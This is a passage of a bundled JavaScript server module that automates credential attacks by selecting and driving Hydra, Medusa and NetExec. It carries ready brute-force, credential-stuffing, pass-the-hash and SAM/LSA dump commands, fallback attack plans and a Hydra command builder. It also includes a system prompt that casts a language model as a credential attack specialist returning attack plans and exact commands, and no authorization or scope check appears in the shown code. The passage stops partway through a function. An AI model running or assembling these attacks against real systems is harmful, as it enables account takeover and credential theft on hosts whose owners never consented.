import "./chunk-KFQGP6VL.js";

// server/lib/external-credential-tools.ts
import { spawn, execSync } from "child_process";
var TOOL_KNOWLEDGE_BASE = {
  hydra: {
    fullName: "THC Hydra",
    license: "AGPL-3.0",
    description: `THC Hydra is the world's fastest parallelized network login cracker. It supports over 50 protocols and can run up to 64 parallel connections simultaneously. Hydra uses a producer-consumer model where connection threads are reused across credential pairs, making it extremely efficient for large credential lists.`,
    protocols: {
      native: [
        "ssh",
        "ftp",
        "telnet",
        "http-get",
        "http-post",
        "http-head",
        "http-get-form",
        "http-post-form",
        "https-get-form",
        "https-post-form",
        "http-proxy",
        "http-proxy-urlenum",
        "socks5",
        "mysql",
        "postgres",
        "mssql",
        "oracle-listener",
        "oracle-sid",
        "rdp",
        "vnc",
        "smb",
        "smbnt",
        "smtp",
        "smtp-enum",
        "pop3",
        "imap",
        "snmp",
        "ldap2",
        "ldap3",
        "redis",
        "memcached",
        "mongodb",
        "cisco",
        "cisco-enable",
        "svn",
        "cvs",
        "git",
        "adam6500",
        "asterisk",
        "afp",
        "firebird",
        "ncp",
        "nntp",
        "pcanywhere",
        "pcnfs",
        "rexec",
        "rlogin",
        "rsh",
        "rtsp",
        "s7-300",
        "sapr3",
        "sip",
        "teamspeak",
        "vmauthd",
        "xmpp"
      ],
      httpFormSyntax: `hydra -l USER -p PASS HOST http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"`,
      notes: "HTTP form attacks use a special syntax: 'path:form_params:failure_string' or 'path:form_params:S=success_string'"
    },
    strengths: [
      "Fastest brute-force tool available \u2014 up to 64 parallel connections",
      "Supports 50+ protocols natively with optimized implementations",
      "HTTP form attack support with CSRF token handling via custom headers",
      "Can resume interrupted sessions with -R flag",
      "Supports SSL/TLS for all applicable protocols",
      "IPv6 support for all modules",
      "Can use colon-separated username:password files for credential stuffing",
      "Verbose output modes for debugging connection issues",
      "Proxy support (HTTP, SOCKS4, SOCKS5) for routing through intermediaries",
      "Widely documented with extensive community support"
    ],
    weaknesses: [
      "Can be noisy \u2014 high parallelism may trigger IDS/WAF alerts",
      "No native Active Directory / Kerberos support",
      "No pass-the-hash capability (requires plaintext passwords)",
      "HTTP form module syntax can be complex for dynamic pages",
      "No built-in domain enumeration or post-exploitation",
      "May crash on very long password lists (>10M entries) without proper memory management",
      "Limited error recovery \u2014 failed connections may not be retried automatically"
    ],
    bestFor: [
      "High-speed brute force against SSH, FTP, Telnet, RDP, VNC",
      "Web application login form attacks (HTTP POST/GET forms)",
      "Database credential testing (MySQL, PostgreSQL, MSSQL, Oracle, Redis, MongoDB)",
      "Email service attacks (SMTP, POP3, IMAP)",
      "Network device login testing (SNMP, Cisco, LDAP)",
      "When speed is the primary concern and stealth is secondary",
      "Large credential lists that need to be tested quickly",
      "Multi-protocol targets where many services need testing"
    ],
    avoidFor: [
      "Active Directory environments (use NetExec instead)",
      "Pass-the-hash attacks (use NetExec instead)",
      "Targets with aggressive rate limiting or WAF (use Medusa with delays)",
      "When post-exploitation actions are needed after credential discovery",
      "Kerberos-based authentication",
      "When fine-grained per-host thread control is needed (use Medusa)"
    ],
    commandExamples: {
      sshBrute: "hydra -L users.txt -P passwords.txt ssh://target:22 -t 16 -f",
      httpPostForm: 'hydra -l admin -P passwords.txt target http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid credentials" -t 8',
      ftpBrute: "hydra -L users.txt -P passwords.txt ftp://target -t 32",
      rdpBrute: "hydra -L users.txt -P passwords.txt rdp://target -t 4",
      mysqlBrute: "hydra -l root -P passwords.txt mysql://target -t 16",
      redisBrute: "hydra -P passwords.txt redis://target",
      smbBrute: "hydra -L users.txt -P passwords.txt smb://target -t 8",
      credentialStuffing: "hydra -C creds.txt ssh://target -t 16",
      withProxy: "hydra -L users.txt -P passwords.txt ssh://target -t 16 -o results.txt"
    },
    outputFormat: {
      successPattern: /\[(\d+)\]\[(\w+)\]\s+host:\s+(\S+)\s+login:\s+(\S+)\s+password:\s+(.+)/,
      summaryPattern: /(\d+) of (\d+) target/,
      example: "[22][ssh] host: 192.168.1.1   login: admin   password: secret123"
    }
  },
  medusa: {
    fullName: "Medusa (Foofus)",
    license: "GPLv2",
    description: `Medusa is a speedy, massively parallel, modular login brute-forcer. Unlike Hydra's connection-reuse model, Medusa uses a thread-per-host architecture that provides more stable connections and better error handling per target. Each authentication module is a separate .mod file, making it highly extensible.`,
    protocols: {
      native: [
        "ssh",
        "ftp",
        "telnet",
        "http",
        "web-form",
        "mysql",
        "postgres",
        "mssql",
        "rdp",
        "vnc",
        "rlogin",
        "rexec",
        "rsh",
        "smb",
        "smbnt",
        "smtp",
        "smtp-vrfy",
        "pop3",
        "imap",
        "snmp",
        "svn",
        "cvs",
        "ncp",
        "nntp",
        "afp",
        "pcanywhere",
        "pcnfs",
        "vmauthd",
        "wrapper"
      ],
      webFormSyntax: `medusa -h HOST -u USER -p PASS -M web-form -m FORM:"target.com/login" -m FORM-DATA:"post?user=&pass=" -m DENY-SIGNAL:"Invalid"`,
      notes: "Medusa's web-form module uses -m parameters for form configuration. The FORM-DATA parameter specifies the POST body with & separating fields."
    },
    strengths: [
      "Thread-per-host model provides stable, predictable connections",
      "Better error recovery than Hydra \u2014 retries failed connections automatically",
      "Modular architecture \u2014 each protocol is a separate loadable module",
      "Fine-grained control over per-host parallelism (-t threads per host)",
      "Can test multiple hosts simultaneously (-T total threads)",
      "Cleaner output format that's easier to parse programmatically",
      "Lower memory footprint than Hydra for large target lists",
      "More reliable against flaky or slow-responding services",
      "Supports combo files (user:pass format) for credential stuffing",
      "Can specify different credentials per host"
    ],
    weaknesses: [
      "Slower than Hydra for single-target attacks (thread-per-host overhead)",
      "Fewer supported protocols than Hydra (~25 vs 50+)",
      "No native Active Directory / Kerberos support",
      "No pass-the-hash capability",
      "Web form module is less flexible than Hydra's HTTP form syntax",
      "Less actively maintained than Hydra (though stable)",
      "No built-in proxy support",
      "No IPv6 support in some modules"
    ],
    bestFor: [
      "Multi-host credential testing (scanning entire subnets)",
      "Targets with flaky or unreliable connections",
      "When stability matters more than raw speed",
      "SSH, FTP, Telnet testing with reliable error handling",
      "Database credential testing with connection retry logic",
      "When fine-grained per-host thread control is needed",
      "Long-running attacks that need to survive connection drops",
      "Environments where Hydra crashes or produces unreliable results"
    ],
    avoidFor: [
      "Active Directory environments (use NetExec instead)",
      "Pass-the-hash attacks (use NetExec instead)",
      "When maximum speed is required (use Hydra instead)",
      "Complex HTTP form attacks with CSRF tokens (use Hydra instead)",
      "Protocols not in Medusa's module list (use Hydra instead)",
      "When proxy routing is required (use Hydra instead)"
    ],
    commandExamples: {
      sshBrute: "medusa -h target -U users.txt -P passwords.txt -M ssh -t 8 -f",
      ftpBrute: "medusa -h target -U users.txt -P passwords.txt -M ftp -t 16",
      rdpBrute: "medusa -h target -U users.txt -P passwords.txt -M rdp -t 4",
      mysqlBrute: "medusa -h target -u root -P passwords.txt -M mysql -t 8",
      smbBrute: "medusa -h target -U users.txt -P passwords.txt -M smbnt -t 8",
      multiHost: "medusa -H hosts.txt -U users.txt -P passwords.txt -M ssh -T 32 -t 4",
      credentialStuffing: "medusa -h target -C creds.txt -M ssh -t 8",
      webForm: 'medusa -h target -u admin -P passwords.txt -M web-form -m FORM:"target.com/login" -m FORM-DATA:"post?username=&password=" -m DENY-SIGNAL:"Invalid"'
    },
    outputFormat: {
      successPattern: /ACCOUNT FOUND:\s+\[(\w+)\]\s+Host:\s+(\S+)\s+User:\s+(\S+)\s+Password:\s+(\S+)/,
      summaryPattern: /Medusa has finished/,
      example: "ACCOUNT FOUND: [ssh] Host: 192.168.1.1 User: admin Password: secret123 [SUCCESS]"
    }
  },
  netexec: {
    fullName: "NetExec (CrackMapExec successor)",
    license: "BSD 2-Clause",
    description: `NetExec (formerly CrackMapExec) is the premier tool for pentesting Windows/Active Directory environments. It goes far beyond simple credential testing \u2014 it can enumerate domains, dump credentials, execute commands, and perform complex AD attacks like Kerberoasting, AS-REP roasting, and pass-the-hash. It is the ONLY tool in this suite that understands Active Directory natively.`,
    protocols: {
      native: [
        "smb",
        "winrm",
        "ldap",
        "mssql",
        "rdp",
        "ssh",
        "ftp",
        "wmi"
      ],
      notes: "NetExec protocols are specified as the first argument: nxc smb target -u user -p pass"
    },
    strengths: [
      "Native Active Directory support \u2014 understands domains, forests, trusts",
      "Pass-the-hash: authenticate with NTLM hashes instead of passwords (-H flag)",
      "Pass-the-ticket: authenticate with Kerberos tickets",
      "Kerberoasting: extract service ticket hashes for offline cracking",
      "AS-REP roasting: find accounts without Kerberos pre-auth",
      "Domain enumeration: users, groups, shares, GPOs, trusts",
      "Credential dumping: SAM, LSA secrets, NTDS.dit, LAPS passwords",
      "Command execution: via SMB (smbexec), WMI (wmiexec), WinRM (evil-winrm)",
      "Share enumeration and spidering for sensitive files",
      "BloodHound integration for attack path visualization",
      "Can spray credentials across entire domain from single command",
      "Supports both plaintext and hash-based authentication",
      "Built-in modules for common post-exploitation tasks",
      "JSON output mode for easy programmatic parsing",
      "Color-coded output: green (+) = success, red (-) = failure"
    ],
    weaknesses: [
      "Limited to Windows/AD-centric protocols (SMB, WinRM, LDAP, MSSQL, RDP)",
      "Not suitable for non-Windows services (use Hydra/Medusa for SSH, FTP, HTTP)",
      "Slower than Hydra for simple brute force (designed for AD, not speed)",
      "No HTTP form attack support",
      "No support for many network protocols (SNMP, VNC, SMTP, POP3, IMAP, etc.)",
      "Requires Python environment (heavier dependency than compiled C tools)",
      "Some modules require local admin privileges on target"
    ],
    bestFor: [
      "Active Directory credential spraying and validation",
      "Pass-the-hash attacks (NTLM hash authentication)",
      "Windows domain enumeration (users, groups, shares, GPOs)",
      "SMB credential testing and share enumeration",
      "WinRM/PowerShell remoting credential validation",
      "LDAP bind credential testing",
      "MSSQL credential testing with Windows auth",
      "Post-exploitation credential dumping (SAM, LSA, NTDS.dit)",
      "Kerberoasting and AS-REP roasting",
      "When you need to do more than just test credentials (enum, exec, dump)",
      "Multi-host domain-wide credential spraying",
      "Validating credentials discovered by other tools against AD"
    ],
    avoidFor: [
      "Non-Windows targets (use Hydra or Medusa instead)",
      "HTTP/HTTPS web application login forms (use Hydra instead)",
      "Email protocols \u2014 SMTP, POP3, IMAP (use Hydra instead)",
      "Database-only targets \u2014 MySQL, PostgreSQL, Redis, MongoDB (use Hydra instead)",
      "Network devices \u2014 SNMP, Cisco, LDAP-only (use Hydra instead)",
      "When maximum brute-force speed is needed (use Hydra instead)",
      "Simple single-service credential testing without AD context"
    ],
    commandExamples: {
      smbSpray: "nxc smb target -u users.txt -p 'Password1' --continue-on-success",
      smbBrute: "nxc smb target -u users.txt -p passwords.txt --continue-on-success",
      passTheHash: "nxc smb target -u admin -H 'aad3b435b51404eeaad3b435b51404ee:hash' --shares",
      winrmAuth: "nxc winrm target -u user -p pass",
      ldapEnum: "nxc ldap target -u user -p pass --users",
      mssqlAuth: "nxc mssql target -u sa -p pass",
      rdpAuth: "nxc rdp target -u user -p pass",
      domainEnum: "nxc smb target -u user -p pass --users --groups --shares",
      kerberoast: "nxc ldap target -u user -p pass --kerberoasting output.txt",
      samDump: "nxc smb target -u admin -p pass --sam",
      lsaDump: "nxc smb target -u admin -p pass --lsa",
      multiHost: "nxc smb 192.168.1.0/24 -u user -p pass",
      jsonOutput: "nxc smb target -u user -p pass --json"
    },
    outputFormat: {
      successPattern: /SMB\s+(\S+)\s+\d+\s+(\S+)\s+\[\+\]\s+(?:(\S+)\\)?(\S+):(\S+)/,
      failurePattern: /SMB\s+(\S+)\s+\d+\s+(\S+)\s+\[-\]/,
      adminPattern: /\(Pwn3d!\)/,
      example: "SMB  192.168.1.1  445  DC01  [+] DOMAIN\\admin:Password1 (Pwn3d!)"
    },
    /** AD-specific attack types that only NetExec can perform */
    adAttackTypes: [
      "password_spray",
      "pass_the_hash",
      "pass_the_ticket",
      "kerberoasting",
      "asrep_roasting",
      "sam_dump",
      "lsa_dump",
      "ntds_dump",
      "share_enum",
      "user_enum",
      "group_enum",
      "gpo_enum",
      "laps_dump",
      "bloodhound_collect"
    ]
  }
};
var TOOL_SELECTION_SYSTEM_PROMPT = `You are an expert penetration tester and credential attack specialist. Your role is to analyze attack scenarios and recommend the optimal tool from the following three options:

## Tool 1: THC Hydra (AGPL-3.0)
- **Primary strength:** Fastest parallelized brute-forcer with 50+ protocol support
- **Max parallel connections:** 64
- **Best protocols:** SSH, FTP, HTTP forms, RDP, VNC, MySQL, PostgreSQL, MSSQL, Redis, MongoDB, SMTP, POP3, IMAP, SNMP, LDAP, Telnet
- **Unique features:** HTTP form attacks with CSRF handling, proxy support, IPv6, session resume
- **Speed rating:** FAST
- **Use when:** Speed is priority, target has many services, web form attacks, non-Windows environments
- **Avoid when:** Active Directory, pass-the-hash needed, target has aggressive rate limiting

## Tool 2: Medusa (GPLv2)
- **Primary strength:** Stable thread-per-host model with automatic error recovery
- **Max parallel connections:** Configurable per-host and total threads
- **Best protocols:** SSH, FTP, Telnet, HTTP, MySQL, PostgreSQL, MSSQL, RDP, VNC, SMB, SMTP, POP3, IMAP, SNMP
- **Unique features:** Per-host thread control, multi-host simultaneous testing, connection retry
- **Speed rating:** MODERATE
- **Use when:** Multi-host scanning, flaky targets, stability needed, long-running attacks
- **Avoid when:** Active Directory, maximum speed needed, complex HTTP forms, proxy required

## Tool 3: NetExec/CrackMapExec (BSD 2-Clause)
- **Primary strength:** THE tool for Active Directory and Windows domain attacks
- **Protocols:** SMB, WinRM, LDAP, MSSQL, RDP, SSH, FTP, WMI
- **Unique features:** Pass-the-hash, Kerberoasting, AS-REP roasting, domain enumeration, credential dumping (SAM/LSA/NTDS.dit), share enumeration, command execution, BloodHound integration
- **Speed rating:** MODERATE (optimized for AD, not raw speed)
- **Use when:** Windows/AD targets, pass-the-hash, domain enumeration, post-exploitation needed, SMB attacks
- **Avoid when:** Non-Windows targets, HTTP web forms, email protocols, database-only targets, network devices

## Decision Framework

1. **Is the target in an Active Directory environment?** \u2192 NetExec
2. **Is pass-the-hash or Kerberos authentication needed?** \u2192 NetExec
3. **Is the target a Windows domain controller or file server?** \u2192 NetExec
4. **Is the target a web application login form?** \u2192 Hydra
5. **Are multiple hosts being tested simultaneously?** \u2192 Medusa (better multi-host) or Hydra (faster per-host)
6. **Is the target connection flaky or unreliable?** \u2192 Medusa
7. **Is maximum speed the priority?** \u2192 Hydra
8. **Is the target a non-Windows service (SSH, FTP, MySQL, etc.)?** \u2192 Hydra (fastest) or Medusa (most stable)
9. **Is post-exploitation needed after credential discovery?** \u2192 NetExec
10. **Is the target behind a WAF or rate limiter?** \u2192 Medusa (better delay control) or Hydra (with -W flag)

## Protocol-to-Tool Mapping (Quick Reference)

| Protocol | First Choice | Second Choice | Avoid |
|----------|-------------|---------------|-------|
| SSH | Hydra | Medusa | NetExec (unless AD-joined Linux) |
| FTP | Hydra | Medusa | NetExec |
| HTTP Form | Hydra | - | NetExec, Medusa |
| HTTP Basic | Hydra | Medusa | NetExec |
| RDP | NetExec (if AD) | Hydra | Medusa |
| SMB | NetExec | Hydra | Medusa |
| WinRM | NetExec | - | Hydra, Medusa |
| LDAP | NetExec (if AD) | Hydra | Medusa |
| MySQL | Hydra | Medusa | NetExec |
| PostgreSQL | Hydra | Medusa | NetExec |
| MSSQL | NetExec (if AD) | Hydra | Medusa |
| Redis | Hydra | - | NetExec, Medusa |
| MongoDB | Hydra | - | NetExec, Medusa |
| VNC | Hydra | Medusa | NetExec |
| SMTP | Hydra | Medusa | NetExec |
| POP3 | Hydra | Medusa | NetExec |
| IMAP | Hydra | Medusa | NetExec |
| SNMP | Hydra | Medusa | NetExec |
| Telnet | Hydra | Medusa | NetExec |

Respond with a JSON object containing:
- "recommended": the tool name ("hydra", "medusa", or "netexec")
- "reasoning": 2-3 sentences explaining why this tool is best for this scenario
- "confidence": a number 0-100 indicating confidence in the recommendation
- "alternatives": array of {tool, reason} for backup options
- "attackPlan": a brief step-by-step plan for executing the attack with the recommended tool
- "commandTemplate": the exact command line that should be used (with placeholders for credentials)`;
var toolDetectionCache = /* @__PURE__ */ new Map();
function detectTool(name, versionFlag = "--version") {
  const cached = toolDetectionCache.get(name);
  if (cached) return cached;
  try {
    const whichResult = execSync(`which ${name} 2>/dev/null`, { encoding: "utf-8", timeout: 5e3 }).trim();
    if (!whichResult) {
      const result2 = { installed: false, path: null, version: null };
      toolDetectionCache.set(name, result2);
      return result2;
    }
    let version = null;
    try {
      const versionOutput = execSync(`${name} ${versionFlag} 2>&1 || true`, { encoding: "utf-8", timeout: 5e3 });
      const versionMatch = versionOutput.match(/v?(\d+\.\d+(?:\.\d+)?)/);
      version = versionMatch ? versionMatch[1] : null;
    } catch {
    }
    const result = { installed: true, path: whichResult, version };
    toolDetectionCache.set(name, result);
    return result;
  } catch {
    const result = { installed: false, path: null, version: null };
    toolDetectionCache.set(name, result);
    return result;
  }
}
function clearToolDetectionCache() {
  toolDetectionCache.clear();
}
function detectAllTools() {
  return {
    hydra: detectTool("hydra", "-h"),
    medusa: detectTool("medusa", "-V"),
    netexec: detectTool("nxc", "--version") || detectTool("netexec", "--version") || detectTool("crackmapexec", "--version"),
    builtin: { installed: true, path: "internal", version: "1.0.0" }
  };
}
function getToolCapabilities() {
  const detected = detectAllTools();
  return [
    {
      tool: "hydra",
      displayName: "THC Hydra",
      version: detected.hydra.version,
      installed: detected.hydra.installed,
      binaryPath: detected.hydra.path,
      license: "AGPL-3.0",
      protocols: [...TOOL_KNOWLEDGE_BASE.hydra.protocols.native],
      attackModes: ["brute_force", "dictionary", "credential_stuffing", "password_spray"],
      specialCapabilities: [
        "HTTP form attacks with CSRF handling",
        "Proxy support (HTTP/SOCKS4/SOCKS5)",
        "Session resume (-R flag)",
        "IPv6 support",
        "SSL/TLS for all protocols",
        "Up to 64 parallel connections"
      ],
      performance: {
        maxParallelConnections: 64,
        supportsResume: true,
        supportsOutputParsing: true,
        relativeSpeed: "fast"
      },
      idealFor: [...TOOL_KNOWLEDGE_BASE.hydra.bestFor],
      avoidWhen: [...TOOL_KNOWLEDGE_BASE.hydra.avoidFor]
    },
    {
      tool: "medusa",
      displayName: "Medusa",
      version: detected.medusa.version,
      installed: detected.medusa.installed,
      binaryPath: detected.medusa.path,
      license: "GPLv2",
      protocols: [...TOOL_KNOWLEDGE_BASE.medusa.protocols.native],
      attackModes: ["brute_force", "dictionary", "credential_stuffing"],
      specialCapabilities: [
        "Thread-per-host architecture for stability",
        "Automatic connection retry on failure",
        "Multi-host simultaneous testing",
        "Per-host and global thread control",
        "Modular protocol architecture",
        "Combo file support (user:pass)"
      ],
      performance: {
        maxParallelConnections: 256,
        supportsResume: false,
        supportsOutputParsing: true,
        relativeSpeed: "moderate"
      },
      idealFor: [...TOOL_KNOWLEDGE_BASE.medusa.bestFor],
      avoidWhen: [...TOOL_KNOWLEDGE_BASE.medusa.avoidFor]
    },
    {
      tool: "netexec",
      displayName: "NetExec (CrackMapExec)",
      version: detected.netexec.version,
      installed: detected.netexec.installed,
      binaryPath: detected.netexec.path,
      license: "BSD 2-Clause",
      protocols: [...TOOL_KNOWLEDGE_BASE.netexec.protocols.native],
      attackModes: [
        "brute_force",
        "password_spray",
        "pass_the_hash",
        "kerberoasting",
        "asrep_roasting",
        "credential_dump"
      ],
      specialCapabilities: [
        "Active Directory native support",
        "Pass-the-hash (NTLM hash auth)",
        "Kerberoasting and AS-REP roasting",
        "Domain enumeration (users, groups, shares, GPOs)",
        "Credential dumping (SAM, LSA, NTDS.dit)",
        "Command execution (SMBExec, WMIExec, WinRM)",
        "Share enumeration and spidering",
        "BloodHound data collection",
        "LAPS password retrieval",
        "JSON output mode"
      ],
      performance: {
        maxParallelConnections: 100,
        supportsResume: false,
        supportsOutputParsing: true,
        relativeSpeed: "moderate"
      },
      idealFor: [...TOOL_KNOWLEDGE_BASE.netexec.bestFor],
      avoidWhen: [...TOOL_KNOWLEDGE_BASE.netexec.avoidFor]
    },
    {
      tool: "builtin",
      displayName: "Built-in Engine",
      version: "1.0.0",
      installed: true,
      binaryPath: null,
      license: "Proprietary",
      protocols: [
        "http_form",
        "http_basic",
        "http_digest",
        "http_json_api",
        "ssh",
        "ftp",
        "telnet",
        "redis"
      ],
      attackModes: ["brute_force", "password_spray", "credential_stuffing", "default_creds", "dictionary"],
      specialCapabilities: [
        "LLM-powered login form detection",
        "CSRF token auto-extraction",
        "Default credential database (95+ OEM defaults)",
        "Targeted password generation from org info",
        "Integrated lockout detection",
        "No external dependencies required"
      ],
      performance: {
        maxParallelConnections: 10,
        supportsResume: false,
        supportsOutputParsing: true,
        relativeSpeed: "slow"
      },
      idealFor: [
        "Quick credential testing without external tool installation",
        "Default credential scanning against known device types",
        "LLM-assisted web login form detection and configuration",
        "Targeted password list generation from organization intelligence"
      ],
      avoidWhen: [
        "When external tools are available (they are faster and more reliable)",
        "Large-scale brute force attacks",
        "Active Directory environments"
      ]
    }
  ];
}
async function recommendTool(scenario) {
  const detected = detectAllTools();
  const availableTools = Object.entries(detected).filter(([_, d]) => d.installed).map(([name]) => name);
  const scenarioDescription = [
    `Target: ${scenario.targetHost}:${scenario.targetPort}`,
    `Protocol: ${scenario.protocol}`,
    `Attack mode: ${scenario.attackMode}`,
    scenario.isActiveDirectory ? "Environment: Active Directory domain" : "",
    scenario.hasNtlmHash ? "Has NTLM hash for pass-the-hash" : "",
    scenario.isMultiHost ? "Multiple hosts to test" : "",
    scenario.hasWaf ? "WAF/rate limiting detected on target" : "",
    scenario.targetOs ? `Target OS: ${scenario.targetOs}` : "",
    scenario.needsPostExploit ? "Post-exploitation actions needed after credential discovery" : "",
    scenario.connectionStability ? `Connection stability: ${scenario.connectionStability}` : "",
    `Available tools: ${availableTools.join(", ")}`
  ].filter(Boolean).join("\n");
  try {
    const { invokeLLM } = await import("./llm-Q4K7UUIX.js");
    const response = await invokeLLM({
      _caller: "external-credential-tools.recommendTool",
      _priority: "bulk",
      messages: [
        { role: "system", content: TOOL_SELECTION_SYSTEM_PROMPT },
        {
          role: "user",
          content: `Analyze this attack scenario and recommend the best tool:

${scenarioDescription}

Respond with a JSON object as specified in your instructions.`
        }
      ],
      response_format: {
        type: "json_schema",
        json_schema: {
          name: "tool_recommendation",
          strict: true,
          schema: {
            type: "object",
            properties: {
              recommended: { type: "string", description: "Tool name: hydra, medusa, or netexec" },
              reasoning: { type: "string", description: "2-3 sentence explanation" },
              confidence: { type: "number", description: "Confidence 0-100" },
              alternatives: {
                type: "array",
                items: {
                  type: "object",
                  properties: {
                    tool: { type: "string" },
                    reason: { type: "string" }
                  },
                  required: ["tool", "reason"],
                  additionalProperties: false
                }
              },
              attackPlan: { type: "string", description: "Step-by-step attack plan" },
              commandTemplate: { type: "string", description: "Command line template" }
            },
            required: ["recommended", "reasoning", "confidence", "alternatives", "attackPlan", "commandTemplate"],
            additionalProperties: false
          }
        }
      }
    });
    const parsed = JSON.parse(response.choices[0].message.content || "{}");
    if (!availableTools.includes(parsed.recommended)) {
      const fallback = availableTools.find((t) => t !== "builtin") || "builtin";
      parsed.recommended = fallback;
      parsed.reasoning = `Original recommendation (${parsed.recommended}) not installed. Falling back to ${fallback}. ${parsed.reasoning}`;
      parsed.confidence = Math.max(parsed.confidence - 20, 30);
    }
    return {
      recommended: parsed.recommended,
      reasoning: parsed.reasoning,
      confidence: parsed.confidence,
      alternatives: parsed.alternatives || [],
      attackPlan: parsed.attackPlan
    };
  } catch (err) {
    return deterministicRecommendation(scenario, availableTools);
  }
}
function deterministicRecommendation(scenario, availableTools) {
  const has = (tool) => availableTools.includes(tool);
  const proto = scenario.protocol.toLowerCase();
  if (scenario.isActiveDirectory || scenario.hasNtlmHash) {
    if (has("netexec")) {
      return {
        recommended: "netexec",
        reasoning: `NetExec is the only tool with native Active Directory support. ${scenario.hasNtlmHash ? "It supports pass-the-hash authentication with NTLM hashes." : "It can enumerate domains, spray credentials, and perform post-exploitation."} No other tool can match its AD capabilities.`,
        confidence: 95,
        alternatives: has("hydra") ? [{ tool: "hydra", reason: "Can test basic SMB auth but lacks AD features" }] : [],
        attackPlan: "1. Validate credentials with NetExec SMB module\n2. Enumerate domain users and groups\n3. Check for admin access (Pwn3d!)\n4. If admin, dump SAM/LSA for additional credentials"
      };
    }
  }
  if (["smb", "winrm", "wmi"].includes(proto)) {
    if (has("netexec")) {
      return {
        recommended: "netexec",
        reasoning: `NetExec is purpose-built for ${proto.toUpperCase()} attacks with native Windows authentication support. It provides credential validation, share enumeration, and post-exploitation capabilities in a single tool.`,
        confidence: 90,
        alternatives: has("hydra") ? [{ tool: "hydra", reason: "Can do basic SMB brute force but lacks enumeration" }] : [],
        attackPlan: `1. Test credentials against ${proto.toUpperCase()} service
2. Check for admin access
3. Enumerate accessible resources
4. Attempt credential dumping if admin`
      };
    }
  }
  if (["http_form", "http_post_form", "http_get_form", "http_json_api", "http"].includes(proto)) {
    if (has("hydra")) {
      return {
        recommended: "hydra",
        reasoning: "Hydra has the most flexible HTTP form attack module, supporting POST/GET forms, custom headers, CSRF tokens, and success/failure string matching. Its 64-thread parallelism makes it the fastest option for web login brute forcing.",
        confidence: 90,
        alternatives: has("medusa") ? [{ tool: "medusa", reason: "Has web-form module but less flexible than Hydra" }] : [],
        attackPlan: "1. Configure HTTP form parameters (action URL, field names, failure string)\n2. Launch Hydra with appropriate thread count\n3. Monitor for successful logins\n4. Validate discovered credentials manually"
      };
    }
  }
  if (scenario.connectionStability === "flaky") {
    if (has("medusa")) {
      return {
        recommended: "medusa",
        reasoning: "Medusa's thread-per-host architecture provides automatic connection retry and better error recovery than Hydra. For flaky or unreliable targets, Medusa will complete more attempts successfully without crashing.",
        confidence: 85,
        alternatives: has("hydra") ? [{ tool: "hydra", reason: "Faster but may lose connections on flaky targets" }] : [],
        attackPlan: "1. Configure per-host thread count (lower for stability)\n2. Launch Medusa with retry enabled\n3. Monitor output for connection errors\n4. Adjust thread count if errors persist"
      };
    }
  }
  if (scenario.isMultiHost) {
    if (has("medusa")) {
      return {
        recommended: "medusa",
        reasoning: "Medusa's thread-per-host model excels at multi-host scanning, allowing independent thread pools per target. This prevents one slow host from blocking attacks against others. Use -H for host file and -T for total threads.",
        confidence: 80,
        alternatives: has("hydra") ? [{ tool: "hydra", reason: "Faster per-host but less efficient multi-host management" }] : [],
        attackPlan: "1. Prepare host list file\n2. Configure per-host (-t) and total (-T) thread counts\n3. Launch Medusa against all hosts simultaneously\n4. Review per-host results"
      };
    }
  }
  if (scenario.hasWaf) {
    if (has("medusa")) {
      return {
        recommended: "medusa",
        reasoning: "Medusa's thread-per-host model provides more predictable request rates, making it easier to stay under WAF rate limits. Its automatic retry on connection failure also handles WAF-induced drops gracefully.",
        confidence: 75,
        alternatives: has("hydra") ? [{ tool: "hydra", reason: "Can use -W flag for wait time but less predictable rate" }] : [],
        attackPlan: "1. Set low thread count (-t 2) to avoid rate limits\n2. Enable connection retry\n3. Monitor for 429/403 responses\n4. Adjust timing if WAF blocks detected"
      };
    }
  }
  if (has("hydra")) {
    return {
      recommended: "hydra",
      reasoning: `Hydra is the fastest option for ${proto} credential testing with up to 64 parallel connections. It has native support for this protocol and will complete the attack in the shortest time.`,
      confidence: 80,
      alternatives: [
        ...has("medusa") ? [{ tool: "medusa", reason: "More stable but slower alternative" }] : [],
        ...has("netexec") ? [{ tool: "netexec", reason: "Better for AD environments" }] : []
      ],
      attackPlan: `1. Configure Hydra for ${proto} protocol
2. Set thread count based on target capacity
3. Launch attack with credential lists
4. Parse results for successful logins`
    };
  }
  if (has("medusa")) {
    return {
      recommended: "medusa",
      reasoning: `Medusa provides stable, reliable credential testing for ${proto} with automatic error recovery. While not as fast as Hydra, it is more resilient against connection issues.`,
      confidence: 70,
      alternatives: [],
      attackPlan: `1. Configure Medusa for ${proto} module
2. Set appropriate thread count
3. Launch attack
4. Review results`
    };
  }
  return {
    recommended: "builtin",
    reasoning: "No external tools detected. Using the built-in credential attack engine. For better performance, install Hydra (apt install hydra), Medusa (apt install medusa), or NetExec (pip install netexec).",
    confidence: 50,
    alternatives: [],
    attackPlan: "1. Use built-in HTTP/SSH/FTP/Redis testers\n2. Apply rate limiting to avoid lockouts\n3. Monitor for lockout indicators\n4. Review results"
  };
}
function buildHydraCommand(config) {
  const args = [];
  if (config.usernameFile) {
    args.push("-L", config.usernameFile);
  } else if (config.usernames.length === 1) {
    args.push("-l", config.usernames[0]);
  } else if (config.usernames.length > 1) {
    args.push("-L", "/tmp/hydra_users.txt");
  }
  if (config.passwordFile) {
    args.push("-P", config.passwordFile);
  } else if (config.passwords.length === 1) {
    args.push("-p", config.passwords[0]);
  } else if (config.passwords.length > 1) {
    args.push("-P", "/tmp/hydra_passwords.txt");
  }
  args.push("-t", String(Math.min(config.threads, 64)));
  if (config.timeout) {
    args.push("-w", String(config.timeout));
  }
  if (config.stopOnFirst) {
    args.push("-f");
  }
  if (config.delayMs && config.delayMs > 0) {
    args.push("-W", String(Math.ceil(config.delayMs / 1e3)));
  }
  args.push("-o", "/tmp/hydra_output.txt");
  args.push("-V");
  if (config.extraFlags) {
    args.push(...config.extraFlags);
  }
  const proto = mapProtocolToHydra(config.target.protocol, config);
  if (proto.includes("://")) {
    args.push(proto);
  } else {
    args.push(`${proto}://${config.target.host}:${config.target.port}`);
  }
  return args;
}
function mapProtocolToHydra(protocol, config) {
  const host = config.target.host;
  const port = config.target.port;
  switch (protocol) {
    case "ssh":
      return `ssh://${host}:${port}`;
    case "ftp":
      return `ftp://${host}:${port}`;
    case "telnet":
      return `telnet://${host}:${port}`;
    case "rdp":
      return `rdp://${host}:${port}`;
    case "vnc":
      return `vnc://${host}:${port}`;
    case "mysql":
      return `mysql://${host}:${port}`;
    case "postgres":
